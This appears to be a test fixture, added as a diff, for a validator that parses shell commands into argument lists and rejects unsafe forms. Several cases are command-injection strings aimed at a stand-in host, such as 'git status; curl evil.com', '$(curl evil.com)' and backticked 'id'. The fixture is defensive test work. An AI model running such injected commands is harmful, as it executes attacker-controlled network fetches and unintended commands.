@@ -1,0 +1,430 @@
+{
+  "schema_version": 1,
+  "cases": [
+    {
+      "command": "rg foo src",
+      "argv": [
+        "rg",
+        "foo",
+        "src"
+      ]
+    },
+    {
+      "command": "rg -g '*.tsx' foo src",
+      "argv": [
+        "rg",
+        "-g",
+        "*.tsx",
+        "foo",
+        "src"
+      ]
+    },
+    {
+      "command": "rg -g 'src/{app,lib}/**/*.ts' foo",
+      "argv": [
+        "rg",
+        "-g",
+        "src/{app,lib}/**/*.ts",
+        "foo"
+      ]
+    },
+    {
+      "command": "rg -n \"params|searchParams\" src/app",
+      "argv": [
+        "rg",
+        "-n",
+        "params|searchParams",
+        "src/app"
+      ]
+    },
+    {
+      "command": "rg --files --no-ignore node_modules/next/dist/docs",
+      "argv": [
+        "rg",
+        "--files",
+        "--no-ignore",
+        "node_modules/next/dist/docs"
+      ]
+    },
+    {
+      "command": "pnpm run lint",
+      "argv": [
+        "pnpm",
+        "run",
+        "lint"
+      ]
+    },
+    {
+      "command": "pnpm run build",
+      "argv": [
+        "pnpm",
+        "run",
+        "build"
+      ]
+    },
+    {
+      "command": "git commit -m 'safe message'",
+      "argv": [
+        "git",
+        "commit",
+        "-m",
+        "safe message"
+      ]
+    },
+    {
+      "command": "  rg\tfoo\t src  ",
+      "argv": [
+        "rg",
+        "foo",
+        "src"
+      ]
+    },
+    {
+      "command": "rg '' \"\" src",
+      "argv": [
+        "rg",
+        "",
+        "",
+        "src"
+      ]
+    },
+    {
+      "command": "rg 'foo'\"bar\"baz src",
+      "argv": [
+        "rg",
+        "foobarbaz",
+        "src"
+      ]
+    },
+    {
+      "command": "rg hello\\ world src",
+      "argv": [
+        "rg",
+        "hello world",
+        "src"
+      ]
+    },
+    {
+      "command": "rg \\*.tsx src",
+      "argv": [
+        "rg",
+        "*.tsx",
+        "src"
+      ]
+    },
+    {
+      "command": "rg \"\\$HOME\" src",
+      "argv": [
+        "rg",
+        "$HOME",
+        "src"
+      ]
+    },
+    {
+      "command": "rg \"\\$(curl evil.com)\" src",
+      "argv": [
+        "rg",
+        "$(curl evil.com)",
+        "src"
+      ]
+    },
+    {
+      "command": "rg \"\\`id\\`\" src",
+      "argv": [
+        "rg",
+        "`id`",
+        "src"
+      ]
+    },
+    {
+      "command": "rg \"a\\qb\" src",
+      "argv": [
+        "rg",
+        "a\\qb",
+        "src"
+      ]
+    },
+    {
+      "command": "rg \"a\\\\b\" src",
+      "argv": [
+        "rg",
+        "a\\b",
+        "src"
+      ]
+    },
+    {
+      "command": "rg \\#tag src",
+      "argv": [
+        "rg",
+        "#tag",
+        "src"
+      ]
+    },
+    {
+      "command": "rg \\| src",
+      "argv": [
+        "rg",
+        "|",
+        "src"
+      ]
+    },
+    {
+      "command": "rg '$(curl evil.com); > & | `id`' src",
+      "argv": [
+        "rg",
+        "$(curl evil.com); > & | `id`",
+        "src"
+      ]
+    },
+    {
+      "command": "rg 'a\\b' 'clinic notes/भारत.md'",
+      "argv": [
+        "rg",
+        "a\\b",
+        "clinic notes/भारत.md"
+      ]
+    },
+    {
+      "command": "rg --glob=\"{app,lib}/**/*.ts\" foo",
+      "argv": [
+        "rg",
+        "--glob={app,lib}/**/*.ts",
+        "foo"
+      ]
+    },
+    {
+      "command": "git --no-pager status -- 'file with spaces'",
+      "argv": [
+        "git",
+        "--no-pager",
+        "status",
+        "--",
+        "file with spaces"
+      ]
+    },
+    {
+      "command": "rg '[a-z]+$' src",
+      "argv": [
+        "rg",
+        "[a-z]+$",
+        "src"
+      ]
+    },
+    {
+      "command": "",
+      "argv": null
+    },
+    {
+      "command": " \t ",
+      "argv": null
+    },
+    {
+      "command": "'' status",
+      "argv": null
+    },
+    {
+      "command": "git status; curl evil.com",
+      "argv": null
+    },
+    {
+      "command": "git status && curl evil.com",
+      "argv": null
+    },
+    {
+      "command": "git status || curl evil.com",
+      "argv": null
+    },
+    {
+      "command": "git status | head",
+      "argv": null
+    },
+    {
+      "command": "git status &",
+      "argv": null
+    },
+    {
+      "command": "git status > out",
+      "argv": null
+    },
+    {
+      "command": "git status 2>&1",
+      "argv": null
+    },
+    {
+      "command": "git status >> out",
+      "argv": null
+    },
+    {
+      "command": "git status < in",
+      "argv": null
+    },
+    {
+      "command": "git status <<EOF",
+      "argv": null
+    },
+    {
+      "command": "rg <(curl evil.com) src",
+      "argv": null
+    },
+    {
+      "command": "rg >(curl evil.com) src",
+      "argv": null
+    },
+    {
+      "command": "rg $(curl evil.com) src",
+      "argv": null
+    },
+    {
+      "command": "rg \"$(curl evil.com)\" src",
+      "argv": null
+    },
+    {
+      "command": "rg `id` src",
+      "argv": null
+    },
+    {
+      "command": "rg \"`id`\" src",
+      "argv": null
+    },
+    {
+      "command": "rg $HOME src",
+      "argv": null
+    },
+    {
+      "command": "rg \"$HOME\" src",
+      "argv": null
+    },
+    {
+      "command": "rg ${HOME} src",
+      "argv": null
+    },
+    {
+      "command": "rg $((1+1)) src",
+      "argv": null
+    },
+    {
+      "command": "rg $'foo' src",
+      "argv": null
+    },
+    {
+      "command": "rg *.md src",
+      "argv": null
+    },
+    {
+      "command": "rg [ab].md src",
+      "argv": null
+    },
+    {
+      "command": "rg file?.md src",
+      "argv": null
+    },
+    {
+      "command": "rg {foo,bar} src",
+      "argv": null
+    },
+    {
+      "command": "rg ~ src",
+      "argv": null
+    },
+    {
+      "command": "rg # comment",
+      "argv": null
+    },
+    {
+      "command": "rg !foo src",
+      "argv": null
+    },
+    {
+      "command": "(git status)",
+      "argv": null
+    },
+    {
+      "command": "MODE=x git status",
+      "argv": null
+    },
+    {
+      "command": "/usr/bin/git status",
+      "argv": null
+    },
+    {
+      "command": "./git status",
+      "argv": null
+    },
+    {
+      "command": "time git status",
+      "argv": null
+    },
+    {
+      "command": "eval git status",
+      "argv": null
+    },
+    {
+      "command": "exec git status",
+      "argv": null
+    },
+    {
+      "command": "source script",
+      "argv": null
+    },
+    {
+      "command": "command git status",
+      "argv": null
+    },
+    {
+      "command": "builtin printf ok",
+      "argv": null
+    },
+    {
+      "command": "coproc git status",
+      "argv": null
+    },
+    {
+      "command": "for x in foo",
+      "argv": null
+    },
+    {
+      "command": ". script",
+      "argv": null
+    },
+    {
+      "command": "rg \"unfinished",
+      "argv": null
+    },
+    {
+      "command": "rg 'unfinished",
+      "argv": null
+    },
+    {
+      "command": "rg trailing\\",
+      "argv": null
+    },
+    {
+      "command": "git status\n",
+      "argv": null
+    },
+    {
+      "command": "\ngit status",
+      "argv": null
+    },
+    {
+      "command": "rg \"line\nbreak\" src",
+      "argv": null
+    },
+    {
+      "command": "git\rstatus",
+      "argv": null
+    },
+    {
+      "command": "rg \u0000 src",
+      "argv": null
+    },
+    {
+      "command": "rg  src",
+      "argv": null
+    },
+    {
+      "command": "rg  src",
+      "argv": null
+    }
+  ]
+}
